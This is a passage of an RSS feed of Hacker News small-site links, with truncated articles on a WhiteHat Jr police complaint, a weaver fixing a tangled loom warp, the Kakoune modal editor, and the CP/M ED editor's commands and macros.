<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p><strong><span>S</span>haarif Ansari got the call on 11 November</strong> at around 9 in the morning. On the phone was a police officer from Powai police station, in the suburbs of Mumbai. “Ansari please come to the police station,” said the officer. “We have received a complaint from your employer WhiteHat Jr. The company officials are here at the station already. We are waiting for you.”&nbsp;</p> <p>Ansari was taken aback. It is not everyday that you have a police officer call you. Almost immediately he clarified that he did not work at WhiteHat Jr anymore. That he was fired by the company in the first week of September and had had no contact with them since, so what was all this about? The person was in no mood to explain or chat. He cut Ansari off, and asked him to turn up at the station immediately. Caught completely by surprise and with no idea about what was in store for him, Ansari said he was on his way.</p> <p>Once he reached the station, Ansari found two people waiting for him</p></div></div></div></div></div>]]>
            </description>
            <link>https://themorningcontext.com/internet/indias-whitehatjr-is-startup-hell</link>
            <guid isPermaLink="false">hacker-news-small-sites-25195938</guid>
            <pubDate>Tue, 24 Nov 2020 06:41:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[That’s not why I did it]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25195659">thread link</a>) | @MaysonL
<br/>
November 23, 2020 | https://weaversew.com/wordblog/2020/11/07/thats-not-why-i-did-it/ | <a href="https://web.archive.org/web/*/https://weaversew.com/wordblog/2020/11/07/thats-not-why-i-did-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
<div id="content">

	
		<div id="post-11347">
			

			<p>It has been a very long time since I’ve dealt with a major loom screw up.&nbsp; A really long time.&nbsp; Like I don’t remember the last time?&nbsp; And it isn’t because I’m so very good at this whole weaving thing, but it sort of is.&nbsp; I’ve been weaving since the mid 70’s.&nbsp; If there is a mistake, or screw up, I can assure you I made it or did it at some point in my career.&nbsp; One of the glorious things about being a weaver is the pure tenacity that controls what we do and how we approach a situation.&nbsp;&nbsp;</p>
<p>Of course by now, you are all familiar with my daughter and her major accomplishments as a weaver.&nbsp; She works for me now, and is responsible for converting all of my garment patterns into <a href="https://www.weaversew.com/shop/sewing-patterns.html">digital downloads</a>.&nbsp; She is also responsible for filming, producing and editing all of my videos for my YouTube channel, <a href="https://www.youtube.com/channel/UCmz2mYvnteUP11-LvK8-eNg"><em>The Weaver Sews</em></a> and writing all of the Closed Captioning.&nbsp; (Yes, I caught that there were a couple of misspellings in previous episodes…)&nbsp; I couldn’t have moved into this next portion of my professional life without her, but that’s not why I did it…</p>
<p>My daughter, Brianna, yes she has a real name, not the one she uses on Facebook, was asked back last winter if she would give a lecture to her old weaving guild in MA, near where she went to school.&nbsp; The lecture, on differential sett, was scheduled for April of this year.&nbsp; And of course we all know what happened in the northeast by April.&nbsp; The world was cancelled.</p>
<p>Since my daughter is a soon to be 28 year old millennial, she does her best work under deadline pressure.&nbsp; (Truth be told, so do I…)&nbsp; The guild called her last week and asked if she would be willing to give the lecture remotely.&nbsp; Hahahahah!&nbsp; Of course she said yes, which is what I would have done at that age.&nbsp; I use to have a sign on&nbsp; my studio door that said, “Say yes, then worry…”</p>
<p>So my daughter had to build an entire lecture that only existed as an outline, and weave all the samples in less than two weeks (the lecture is next week), plus edit and create new content for me, plus work in the evenings on her schooling, (yes, she is still in school to get her vet tech license).&nbsp; But that’s not why I did it….</p>
<p>One of the samples Brianna decided to weave, was exploring what happens when you use differential sett with really slippery rayon, warp and weft, and then slippery rayon warp and a dragging kind of weft like Shetland wool.&nbsp; The sample with the slippery rayon warp, though challenging, was completely successful.&nbsp; She then wound a warp with the Shetland wool, and the idea was she would tie into the rayon warp and repeat the experiment with a rayon weft and a wool weft, producing an additional two samples.&nbsp;&nbsp;</p>
<p>At one point, she said to me, as I was weaving on another of the looms in the studio, “This is ridiculous, tying in a new warp, I could have started fresh, sleying and rethreading in half the time…”&nbsp; and I couldn’t disagree with her.&nbsp; I’ve never found tying in a new warp to be a time saver.</p>
<p>I went off to do something else and came back and she had only tied in about 2/3rds of the warp, and she moved onto a different loom to do other samples of different weave structures.&nbsp; She told me that she was fed up and didn’t have the time to waste tying in 600 ends on a table loom.&nbsp; But that’s not why I did it…</p>
<p>I went off to other projects of my own, like writing the script for Friday’s <a href="https://www.youtube.com/channel/UCmz2mYvnteUP11-LvK8-eNg"><em>The Weaver Sews</em></a> Youtube installment.&nbsp; I came back and decided to finish tying in the rest of the warp, which would have been 200 ends.&nbsp; It wasn’t a big deal, and I can do stuff like that in my sleep.&nbsp; I was surprised when she directed me to make a square knot, I had always tied in new warps with an overhand knot, but I learned long ago that I didn’t argue with my late husband, and I don’t argue with his daughter.&nbsp; Even though I have almost a half century of experience…</p>
<p>I finished the task and then turned the job of beaming the 1&nbsp; 1/2 yard warp of sticky Shetland wool, onto the warp beam, over to my daughter.&nbsp; I think I went off to bed…</p>
<p>I came back the next day to find the warp abandoned.&nbsp; It was a complete disaster.&nbsp; I don’t think even at my worst I’ve ever had a mess like that.&nbsp; Partly I take some responsibility because my daughter has worked along side of me since she first learned to throw a shuttle.&nbsp; She never had the opportunity to fall flat on her face, like most weavers, including me, have had to do.&nbsp; I’ve always been there to guide her, when she chooses to listen to me.&nbsp; But that’s not why I did it…</p>
<p>Largely what happened, is that when she put tensioning bars in the back of the warp, and tried to beam the new sticky Shetland warp into the old slick rayon warp, the square knots didn’t hold, they slipped right out.&nbsp; And for some reason, the Shetland wool ends, that slipped out of the knots, ended up in the front of the beater, probably about 200 of the 600 ends.&nbsp; I think this wins an award for the most messed up warp I’ve ever seen.&nbsp; That’s partly why I did it…</p>
<p><a href="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster1.jpg"><img loading="lazy" src="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster1-300x225.jpg" alt="" width="300" height="225" srcset="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster1-300x225.jpg 300w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster1-150x113.jpg 150w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster1.jpg 614w" sizes="(max-width: 300px) 100vw, 300px"></a><a href="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster2.jpg"><img loading="lazy" src="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster2-300x225.jpg" alt="" width="300" height="225" srcset="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster2-300x225.jpg 300w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster2-150x113.jpg 150w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster2.jpg 614w" sizes="(max-width: 300px) 100vw, 300px"></a></p>
<p>I felt really sorry for my daughter, she was trying so hard to see this lecture into fruition…&nbsp; But that’s not why I did it…</p>
<p>I felt partly responsible because I knew that when you tie in a warp, you always use overhand knots.&nbsp; There are a lot of things I know, but I don’t know why I know them.&nbsp; And because my daughter requested square knots, I obliged.&nbsp; But that’s not why I did it…</p>
<p>I laid awake all Thursday night haunted by the mess on one of the looms in the garage right underneath of me.&nbsp; I kept thinking, if that were me, I wouldn’t have gone to bed without fixing it.&nbsp; But that’s me, even though I knew I had a video to shoot in the morning. I didn’t sleep the whole night.&nbsp; My daughter just moved to a different loom, and started on a different group of samples she had been planning.</p>
<p>In fact my daughter was so upset by what happened that she couldn’t even look at the loom. She couldn’t even walk over to that area of the studio.&nbsp; &nbsp;She is not use to having major loom screw ups…&nbsp; I’ve largely protected her from that…&nbsp; But that’s not why I did it…</p>
<p>We stopped everything to shoot the new video Friday morning, and I had some computer/business stuff to attend to, but Friday afternoon, I sat at the loom and thought, it has been a very long time since I’ve bailed a loom out of a major temper tantrum, and you know what?&nbsp; I really wanted to just dive in there and fix it.&nbsp; That’s why I wanted to do it.</p>
<p>A couple of years ago, I had my new to me dog chew up a skein of yarn that was being wound into pirns for the weft yarn for a project I was working on.&nbsp; I got distracted by the doorbell, and when I returned I found&nbsp; the skein stretched around my loom, and all the way down the stairs, and the skein chewed beyond help.&nbsp; I can’t believe the number of weaver’s who offered to have me send them the skein and promised to untangle every last yard.&nbsp; There is something about fixing a monumental disaster that is really appealing for a weaver.&nbsp;&nbsp;</p>
<p><a href="https://weaversew.com/wordblog/wp-content/uploads/2020/11/NoroDisaster.jpg"><img loading="lazy" src="https://weaversew.com/wordblog/wp-content/uploads/2020/11/NoroDisaster-169x300.jpg" alt="" width="169" height="300" srcset="https://weaversew.com/wordblog/wp-content/uploads/2020/11/NoroDisaster-169x300.jpg 169w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/NoroDisaster-84x150.jpg 84w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/NoroDisaster.jpg 345w" sizes="(max-width: 169px) 100vw, 169px"></a></p>
<p>I sort of think that it has to do with creating calm in chaos.&nbsp; There is so little in the world that we have any control over.&nbsp; But what happens at our looms, that thing, we have control over.&nbsp; And if what happens on our looms becomes total chaos, then patience, tenacity, and time will make it work.&nbsp; That’s why I did it.&nbsp;&nbsp;</p>
<p>So I started Friday afternoon, after the shoot, and I began to reassess the 600 ends and how to best resolve the mess.&nbsp; Cutting the whole thing off and starting over was an option, but it would mean wasting a perfectly good 1 1/2 yard Shetland warp, that I paid good money for…</p>
<p>I decided that the best way out, was to carefully pull the warps that ended up in front of the reed, since they were only 1 1/2 yards, and resleying them where required (because this was a differential sett warp, there were dents where there were as many as five ends) and then carefully tying them back into the slippery rayon warps that went through the heddles, one by one.&nbsp; I probably spent 10 hours.&nbsp; This was really really challenging.</p>
<p><a href="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster3.jpg"><img loading="lazy" src="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster3-300x225.jpg" alt="" width="300" height="225" srcset="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster3-300x225.jpg 300w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster3-150x113.jpg 150w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster3.jpg 614w" sizes="(max-width: 300px) 100vw, 300px"></a></p>
<p>I did it because there is something intensely satisfying about bringing order to chaos.&nbsp; There is something intense about saving a project.&nbsp; I had my doubts that this was even weaveable, 5 ends of Shetland in a 12 dent reed on a table loom didn’t see realistic, but that wasn’t for me to judge.&nbsp; I grabbed my 5X glasses, a magnifying OTT lite, and a sley hook and started in.&nbsp; 10 hours later I was triumphant.&nbsp;&nbsp;</p>
<p><a href="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster4.jpg"><img loading="lazy" src="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster4-300x225.jpg" alt="" width="300" height="225" srcset="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster4-300x225.jpg 300w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster4-150x113.jpg 150w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster4.jpg 614w" sizes="(max-width: 300px) 100vw, 300px"></a></p>
<p>As I suspected, the warp was unweaveable at that dentage, Brianna had to pull some of the densest parts of the warp, but after much bitching and kvetching, she managed to get the sample she needed, but that’s not why I did it…</p>
<p><a href="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster5.jpg"><img loading="lazy" src="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster5-300x225.jpg" alt="" width="300" height="225" srcset="https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster5-300x225.jpg 300w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster5-150x113.jpg 150w, https://weaversew.com/wordblog/wp-content/uploads/2020/11/Disaster5.jpg 614w" sizes="(max-width: 300px) 100vw, 300px"></a></p>
<p>For all of you out there who have ever had to deal with the warp from hell, remember that there is something healing in finally controlling that which would not be controlled, something triumphant about making something from total chaos.&nbsp; And that’s&nbsp; why I did it.&nbsp; It has been a long time since I’ve had to bail out a major loom screw up, and I loved every minute of it.&nbsp; It wasn’t my screw up, but I felt like a warrior on a mission and I was ultimately successful.&nbsp; Mission accomplished.&nbsp; It was sort of poignant that in the middle of the last inch and a half, that the election finals were called.&nbsp; No matter who you supported, the wait is over.&nbsp; And there is a sort of relief there, and now we as a nation can move forward to what I hope is a common goal.&nbsp; My ten hours of determination over a warp from hell was finally over.&nbsp; And I won.</p>
<p>Brianna did manage to beam and weave the new samples.&nbsp; She did as I suspected have to cull some of the warps in the densest part of the reed.&nbsp; But she learned that on her own.&nbsp; And she also learned that when tying in a new warp, you should use overhand knots.&nbsp; But kids learn by falling flat on their faces and picking themselves up and reevaluating the experience.&nbsp; I never had anyone to tell me otherwise, so I learned the hard way, by trial and error, but that weaver’s tenacity kept me moving forward.&nbsp;&nbsp;</p>

<p>To say that I’m so proud of the body of samples she …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://weaversew.com/wordblog/2020/11/07/thats-not-why-i-did-it/">https://weaversew.com/wordblog/2020/11/07/thats-not-why-i-did-it/</a></em></p>]]>
            </description>
            <link>https://weaversew.com/wordblog/2020/11/07/thats-not-why-i-did-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25195659</guid>
            <pubDate>Tue, 24 Nov 2020 05:43:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Kakoune – The quest for a better code editor]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25195467">thread link</a>) | @imran3740
<br/>
November 23, 2020 | https://kakoune.org/why-kakoune/why-kakoune.html | <a href="https://web.archive.org/web/*/https://kakoune.org/why-kakoune/why-kakoune.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Up to now, I have used vi as an example for modal text editor, mostly because
I expect most programmers have at least heard of it. However, I don’t believe
vi and clones are the best modal text editor out there.</p>
<p>I have been working, for the last 5 years, on a new modal editor called
Kakoune. It first started as a reimplementation of Vim (the most popular vi
clone) whose source code is quite dated. But, I soon realized that we could
improve a lot on vi editing model.</p>
<div>
<h3 id="_improving_on_the_editing_model">Improving on the editing model</h3>
<p>vi basic grammar is <strong>verb</strong> followed by <strong>object</strong>; it’s nice because it matches
well with the order we use in English, "delete word". On the other hand,
it does not match well with the nature of what we express: There is only
a handful of <strong>verbs</strong> in text editing (<strong>d</strong>elete, <strong>y</strong>ank, <strong>p</strong>aste,
<strong>i</strong>nsert…​), and they don’t compose, contrarily to <strong>objects</strong> which can be
arbitrarily complex, and difficult to express. That means that errors are
not handled well. If you express your object wrongly with a delete verb,
the wrong text will get deleted, you will need to undo, and try again.</p>
<p>Kakoune’s grammar is <strong>object</strong> followed by <strong>verb</strong>, combined with instantaneous
feedback, that means you always see the current object (In Kakoune we call
that the selection) before you apply your change, which allows you to correct
errors on the go.</p>
<p>Kakoune tries hard to fix one of the big problems with the vi model: its
lack of interactivity. Because of the <strong>verb</strong> followed by <strong>object</strong> grammar,
vi changes are made in the dark, we don’t see their effect until the whole
editing <strong>sentence</strong> is finished. <code>5dw</code> will delete to next five words, if
you then realize that was one word too many, you need to undo, go back to
your initial position, and try again with <code>4dw</code>. In Kakoune, you would do
<code>5W</code>, see immediately that one more word than expected was selected, type
<code>BH</code> to remove that word from the selection, then <code>d</code> to delete.  At each
step you get visual feedback, and have the opportunity to correct it.</p>
<p>At the lower level, the problem is that vi treats moving around and selecting
an object as two different things. Kakoune unifies that, moving <strong>is</strong> selecting.
<code>w</code> does not just go to the next word, it selects from current position to
the next word. By convention, capital commands tend to expand the selection,
so <code>W</code> would expand the current selection to the next word.</p>
</div>
<div>
<h3 id="_multiple_selections">Multiple selections</h3>
<p>Another particular feature of Kakoune is its support for, and emphasis
towards the use of multiple selections. Multiple selections in Kakoune
are not just one additional feature, it is the central way of interacting
with your text. For example there is no such thing as a "global replace" in
Kakoune. What you would do is select the whole buffer with the <code>%</code> command,
then select all matches for a regex in the current selections (that is the
whole buffer here) with the <code>s</code> command, which prompts for a regex. You would
end up with one selection for each match of your regex and use the insert
mode to do your change. Globally replacing foo with bar would be done with
<code>%sfoo&lt;ret&gt;cbar&lt;esc&gt;</code> which is just the combination of basic building blocks.</p>
<div>
<p>Global replace</p>
<p>
<video src="https://kakoune.org/why-kakoune/video/global-replace.webm" autoplay="" controls="" loop="">
Your browser does not support the video tag.
</video>
</p>
</div>
<p>Multiple selections provides us with a very powerful to express structural
selection: we can subselect matches inside the current selections, keep
selections containing/not containing a match, split selections on a regex,
swap selections contents…​</p>
<p>For example, convert from <code>snake_case_style</code> to <code>camelCaseStyle</code> can be done
by selecting the word (with <code>w</code> for example) then subselecting underscores
in the word with <code>s_&lt;ret&gt;</code>, deleting these with <code>d</code>, then upper casing the
selected characters with <code>~</code>. The inverse operation could be done by selecting
the word, then subselecting the upper case characters with <code>s[A-Z]&lt;ret&gt;</code>
lower casing them with ` and then inserting an underscore before them with
<code>i_&lt;esc&gt;</code> This operation could be put in a macro, and would be reusable
easily to convert any identifier.</p>
<div>
<p>Camel case to snake case</p>
<p>
<video src="https://kakoune.org/why-kakoune/video/camel.webm" autoplay="" controls="" loop="">
Your browser does not support the video tag.
</video>
</p>
</div>
<p>Another example would be parameter swapping, if you had <code>func(arg2, arg1);</code>
you could select the contents of the parenthesis with <code>&lt;a-i&gt;(</code>, split the
selection on comma with <code>S, &lt;ret&gt;</code>, and swap selection contents with <code>&lt;a-)&gt;</code>.</p>
<div>
<p>Swapping arguments</p>
<p>
<video src="https://kakoune.org/why-kakoune/video/args-swap.webm" autoplay="" controls="" loop="">
Your browser does not support the video tag.
</video>
</p>
</div>
<p>It is as well easy to use multiple selections for alignment, as the <code>&amp;</code>
command will align all selection cursors by inserting blanks before
selection start</p>
<div>
<p>Aligning variables</p>
<p>
<video src="https://kakoune.org/why-kakoune/video/align.webm" autoplay="" controls="" loop="">
Your browser does not support the video tag.
</video>
</p>
</div>
<p>Or to use multiple selections as a way to gather some text from different
places and regroup it in another place, thanks to a special form of pasting
<code>&lt;a-p&gt;</code> that will paste every yanked selections instead of the first one.</p>
<div>
<p>Regrouping manager objects together</p>
<p>
<video src="https://kakoune.org/why-kakoune/video/regroup.webm" autoplay="" controls="" loop="">
Your browser does not support the video tag.
</video>
</p>
</div>
</div>
<div>
<h3 id="_interactive_predictable_and_fast">Interactive, predictable and fast</h3>
<p>A design goal of Kakoune is to beat vim at its own game, while providing a
cleaner editing model. The combination of multiple selections and cleaned up
grammar shows that it’s possible to have text edition that is interactive,
predictable, and fast at the same time.</p>
<p>Interactivity comes from providing feedback on every command, made possible by
the inverted <strong>object</strong> then <strong>verb</strong> grammar. Every selection modification
has direct visual feedback; regex-based selections incrementally show what
will get selected, including when the regular expression is invalid; and even
yanking some text displays a message notifying how many selections were yanked.</p>
<p>Predictability comes from the simple effect of most commands. Each command is
conceptually simple, doing one single thing. <code>d</code> deletes whatever is selected,
nothing more. <code>%</code> selects the whole buffer. <code>s</code> prompts for a regex and
selects matches in the previous selection. It is the combination of these
building blocks that allows for complex, but predictable, actions on the text.</p>
<p>Being fast, as in requiring fewer keystrokes, is provided by carefully designing
the set of editing commands so that they interact well together, and by sometimes
sacrificing beauty for useability. For example, <code>&lt;a-s&gt;</code> is equivalent to
<code>S^&lt;ret&gt;</code>: they both split on new lines, but this is such a common use case that
it deserves to have its own key shortcut. As shown in <a href="http://github.com/mawww/golf">http://github.com/mawww/golf</a>,
Kakoune manages to beat Vim at the keystroke count game in most cases,
using much more idiomatic commands.</p>
</div>
<div>
<h3 id="_discoverability">Discoverability</h3>
<p>Keyboard oriented programs tend to be at a disadvantage compared to GUI
applications because they are less discoverable; there is no menu bar on
which to click to see the available options, no tooltip appearing when you
hover above a button explaining what it does.</p>
<p>Kakoune solves this problem through the use of two mechanisms: extensive
completion support, and auto-information display.</p>
<p>When a command is written in a prompt, Kakoune will automatically open a menu
providing you with the available completions for the current parameter. It
will know if the parameter is supposed to be a word against a fixed set
of word, the name of a buffer, a filename, etc…​ Actually, as soon as <code>:</code>
is typed, entering command prompt mode, the list of existing commands will
be displayed in the completion menu.</p>
<p>Additionally, Kakoune will display an information box, describing what the
command does, what optional switches it can take, what they do…​</p>
<div>
<p>Command discoverability</p>
<p>
<video src="https://kakoune.org/why-kakoune/video/discoverability.webm" autoplay="" controls="" loop="">
Your browser does not support the video tag.
</video>
</p>
</div>
<p>That information box gets displayed in other cases, for example if the <code>g</code>
key is hit, which then waits for another key (<code>g</code> is the <strong>goto</strong> commands
prefix), an information box will display all the recognized keys, informing
the user that Kakoune is waiting on a keystroke, and listing the available
options.</p>
<p>To go even further in discoverability, the auto information system can
be set to display an information box after each normal mode keystroke,
explaining what the key pressed just did.</p>
</div>
<div>
<h3 id="_extensive_completion_support">Extensive completion support</h3>
<p>Keyboard oriented programs are much easier to work with when they provide
extensive completion support. For a long time, completion has been prefix
based, and that has been working very well.</p>
<p>More recently, we started to see more and more programs using the so called
fuzzy completion. Fuzzy completion tends to be subsequence based, instead
of prefix based, which means the typed query needs to be a subsequence of
a candidate to be considered matching, instead of a prefix. That will generate
more candidates (all prefix matches are also subsequence matches), so it
needs a good ranking algorithm to sort the matches and put the best ones first.</p>
<p>Kakoune embraces fuzzy matching for its completion support, which kicks in both
during insert mode, and prompt mode.</p>
<div>
<p>Word completion support</p>
<p>
<video src="https://kakoune.org/why-kakoune/video/completion.webm" autoplay="" controls="" loop="">
Your browser does not support the video tag.
</video>
</p>
</div>
<p>Insert mode completion provides completion suggestions while inserting in the
buffer, it can complete words from the buffer, or from all buffers, lines,
filenames, or get completion candidates from an external source, making it
possible to implement intelligent code completion.</p>
<div>
<p>Language specific completion support</p>
<p>
<video src="https://kakoune.org/why-kakoune/video/cpp-completion.webm" autoplay="" controls="" loop="">
Your browser does not support the video tag.
</video>
</p>
</div>
<p>Prompt completion is displayed whenever we enter command mode, and provides
completion candidates that are adapted to the command being entered, and to
the current argument being edited.</p>
</div>
<div>
<h3 id="_a_better_unix_citizen">A better unix citizen</h3>
<p>Easily making programs cooperate with each others is one of the main strength
of the Unix environment. Kakoune is designed to integrate nicely with a POSIX
system: various text editing commands give direct access to the power of POSIX
tools, like <code>|</code>, which prompts for a shell command and pipe selections through
it, replacing their contents with the command output, or <code>$</code> that prompts for
a command, and keeps selections for which the command returned success.</p>
<div>
<p>Using external commands as filters</p>
<p>
<video src="https://kakoune.org/why-kakoune/video/filters.webm" autoplay="" controls="" loop="">
Your browser does not support the video tag.
</video>
</p>
</div>
<p>This is only the tip of the iceberg. Kakoune is very easily controllable from</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kakoune.org/why-kakoune/why-kakoune.html">https://kakoune.org/why-kakoune/why-kakoune.html</a></em></p>]]>
            </description>
            <link>https://kakoune.org/why-kakoune/why-kakoune.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25195467</guid>
            <pubDate>Tue, 24 Nov 2020 05:07:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I Love Ed on CP/M]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25195420">thread link</a>) | @todsacerdoti
<br/>
November 23, 2020 | https://techtinkering.com/articles/i-love-ed-on-cpm/ | <a href="https://web.archive.org/web/*/https://techtinkering.com/articles/i-love-ed-on-cpm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <p>I love ED on CP/M.  It's often derided but I think it's just misunderstood and with a little practise its true value can shine through.  It's elegant, easy to learn and only has about 25 commands but these can be combined.  Once you get used to it most editing tasks are pretty quick.  If I'm editing text that is made up of separate lines, ideally not more than the width of the terminal, I find it excellent.  It does have a line limit of 128 characters so for continuous prose I will switch to something like Wordstar, but for editing source code and config files on CP/M, it's my first choice.</p>
<p>ED came as standard with CP/M and is only 7k for CP/M 2.2 and 10k for CP/M Plus.  One advantage of ED is that it will work both with teleprinters and video terminals without having to be configured for each device.  It is also good at manipulating large files even when the system is short of memory.</p>
<p><img src="https://techtinkering.com/img/articles/cpm_ed_copy_paste.png" title="Copying and Pasting with ED"></p><p>Like many early editors, ED is a modal editor which you start in command mode and while in this mode you can view existing text, move between lines and points in the line.  It allows you to do standard operations such as copy and paste, inserting text from other files, searching for and replacing text, etc.  When we want to enter input mode, we can use the 'I' command.  This is much like VI, except that you can only enter text in the non-command mode but not edit it.  To exit data input mode and return to command mode you use ^Z (CTRL-Z).  These commands can be combined together and one of the most powerful facilities that ED has is the 'M' Macro command to repeat sequences of commands.</p>
<p>Upon executing ED it creates a temporary output file and as you write out from ED it goes to this temporary file.  When editing a file we append text from it into the memory buffer and save to the temporary output file as we go or at the end.</p>
<p>ED keeps track of a number of values such as where it is in the source file,  the line number in the memory buffer and the character pointer (CP) on the line.  These are altered as you move around the file and memory buffer.</p>
<p>I'm not going to give a fuller explanation of how to use ED here because the CP/M 2.2 Operating Manual has a good section on the <a href="http://www.gaby.de/cpm/manuals/archive/cpm22htm/ch2.htm">CP/M Editor</a>.  I do, however, want to show it being used properly in the video below.  Further down in this article I have highlighted some useful command sequences.</p>
<h2>An Example Macro</h2>
<p>ED has a macro facility which allows you to repeat a sequence of commands as many times as you like.  This makes it a good example of the power of ED and the following is a typical macro which searches through the memory buffer and displays any occurrences of the text 'CPM', pauses in case you want to stop the macro and then replaces it with 'CP/M'.</p>
<pre><code>MFCPM^Z0TT6Z-3CSCPM^ZCP/M^Z
</code></pre>
<p>The 'M' command will run the sequences of commands that follows it until an error is raised, such as end of file.  If we wanted to we could prepend 'M' with a number to indicate the number of times we want it to run.  I'll break down each command in the sequence below:</p>
<table>
  <tbody><tr><td><code>M</code></td><td>Run the following command sequence until an error</td></tr>
  <tr><td><code>FCPM^Z</code></td><td>Find 'CPM' and leave Character Pointer (CP) after it</td></tr>
  <tr><td><code>0T</code></td><td>Display the line up to CP</td></tr>
  <tr><td><code>T</code></td><td>Display the rest of the line from CP to end </td></tr>
  <tr><td><code>6Z</code></td><td>Pause</td></tr>
  <tr><td><code>-3C</code></td><td>Move CP back 3 characters</td></tr>
  <tr><td><code>SCPM^ZCP/M^</code></td><td>Substitute 'CPM' for 'CP/M'</td></tr>
</tbody></table>
<p><code>^Z</code> in the above is CTRL-Z and indicates the end of an argument for a command.</p>
<p>The above macro could also be written:</p>
<pre><code>MFCPM^Z0TT6Z-3DICP/M^Z
</code></pre>
<p>In which case:</p>
<table>
  <tbody><tr><td><code>-3D</code></td><td>Delete the 3 previous characters</td></tr>
  <tr><td><code>ICPM^Z</code></td><td>Insert the text 'CP/M'</td></tr>
</tbody></table>
<h2>Video</h2>
<p>The video below shows ED being used properly and some of the things that make it great, including searching and replacing text, copying and pasting, macros and handling files bigger than the available memory.</p>
<p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/7pqaj050X7g" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>
<h2>Common Command Sequences</h2>
<p>Below are some useful command command sequences which may be overlooked when reading the manual for ED.</p>
<div><table>
  <tbody><tr><th>Sequence</th><th>Explanation</th></tr>
  <tr><td>#A</td><td>Load whole file into buffer</td></tr>
  <tr><td>0A</td><td>Load enough of the file to fill half the buffer.  This is great for large files</td></tr>
  <tr><td>#W0A</td><td>Save entire buffer and load more of the source file, enough to fill half of the buffer.  Useful to move through large files.</td></tr>
  <tr><td>0W</td><td>Write half of the buffer to the new file.  Useful to make room of the buffer is full.</td></tr>
  <tr><td>-B</td><td>Move to end of the last line in the buffer</td></tr>
  <tr><td>0L</td><td>Move CP to beginning of line</td></tr>
  <tr><td>L-2C</td><td>Move to end of line before the &lt;cr&gt;&lt;lf&gt; sequence</td></tr>
  <tr><td>0P</td><td>Display page from CP without moving CP</td></tr>
  <tr><td>0LT</td><td>Move CP to beginning of line and display line (Should this be +/-n ??)</td></tr>
  <tr><td>0T</td><td>Type line up to but not including CP</td></tr>
  <tr><td>0TT</td><td>Type whole line without moving CP</td></tr>
  <tr><td>0T&lt;cr&gt;T</td><td>Type whole line without moving CP.  Display up to CP on first list and from CP on next line.  This is useful to see where CP is on line.</td></tr>
  <tr><td>B#T</td><td>Display the whole buffer</td></tr>
  <tr><td>KI</td><td>Replace a line</td></tr>
  <tr><td>0K</td><td>Delete up to CP on current line</td></tr>
  <tr><td>S^L^Z</td><td>Join current line with next</td></tr>
  <tr><td>I^L^Z</td><td>To split a line at CP</td></tr>
  <tr><td>0V</td><td>Print free/total memory buffer stats</td></tr>
  <tr><td>0X</td><td>Empties the temporary default exchange file: X$$$$$$$.LIB, used by the <em>X</em> command</td></tr>
</tbody></table></div>
<p>In the table above the following holds true:</p>
<dl>
  <dt>#</dt><dd>Represents the highest value for n</dd>
  <dt>^L</dt><dd>CTRL-L - Stands for carriage return sequence &lt;cr&gt;&lt;lf&gt;</dd>
  <dt>^Z</dt><dd>CTRL-Z - Indicates the end of a command's argument</dd>
  <dt>&lt;cr&gt;</dt><dd>Carriage Return - Actually pressing the <em>Return</em> key</dd>
</dl>
<br>
<h2>Do You Like ED Too?</h2>
<p>I know that I'm in the minority, but I'm sure there must be other people who also like ED.  I'd love to hear if I'm not alone in this.  You can leave comments via the links below or via the YouTube video above.</p>
      </div></div>]]>
            </description>
            <link>https://techtinkering.com/articles/i-love-ed-on-cpm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25195420</guid>
            <pubDate>Tue, 24 Nov 2020 04:59:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Run Legacy Command Line Apps on Apple Silicon]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25195321">thread link</a>) | @adib
<br/>
